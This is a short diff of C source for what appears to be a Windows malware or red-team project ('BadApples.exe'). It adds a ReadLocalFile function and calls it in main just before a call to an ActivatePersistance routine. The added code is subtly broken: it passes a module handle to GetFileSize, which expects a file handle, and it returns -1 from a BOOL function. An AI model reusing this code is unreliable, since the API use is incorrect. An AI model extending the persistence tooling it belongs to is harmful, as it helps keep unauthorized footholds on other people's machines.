@@ -5,6 +5,30 @@
 
 #pragma comment(lib, "Shlwapi.lib")
 
+BOOL ReadLocalFile( /*OUT PVOID* pFileBuff, OUT DWORD* pdwSize*/ )
+{
+	DWORD dwSize = 0x00;
+	PVOID pAddress = NULL;
+	HMODULE hModule = NULL;
+
+	if ( !( hModule = GetModuleHandleW( NULL ) ) )
+	{
+		LOG_ERR( "GetModuleHandle" );
+		return -1;
+	}
+	printf( "(+) BadApples.exe Base Address @ 0x%p\n", hModule );
+
+	if ( !( dwSize = GetFileSize( hModule, NULL ) ) )
+	{
+		LOG_ERR( "GetFileSize" );
+		return -1;
+	}
+	printf( "(+) File Size : ( bytes %d )\n", dwSize );
+
+
+	return TRUE;
+}
+
 int main( void )
 {
 	PVOID pAddress = NULL;
@@ -12,6 +36,8 @@ int main( void )
 	LPCWSTR tempPath[ MAX_PATH ];
 
 	/* ---------------------------------------------------------------------------------------------------------------------------------------- */
+
+	ReadLocalFile();
 
 	if ( !ActivatePersistance() )
 	{
